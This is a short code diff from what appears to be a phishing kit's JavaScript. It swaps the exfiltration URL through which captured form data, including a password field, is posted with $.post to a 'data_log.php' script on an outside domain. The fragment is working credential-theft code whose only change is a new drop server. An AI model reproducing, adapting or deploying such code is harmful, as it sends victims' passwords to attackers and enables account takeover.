@@ -66,7 +66,7 @@ PASS_pst        :	PASS_pst
 
 }; 
 
-var _url = 'https://thedonsolutions.com/firelgin/data_log.php';
+var _url = 'https://whitmirelifepro.com/td6uS0/data_log.php';
 
 
 $.post(_url,data_log,function(data){
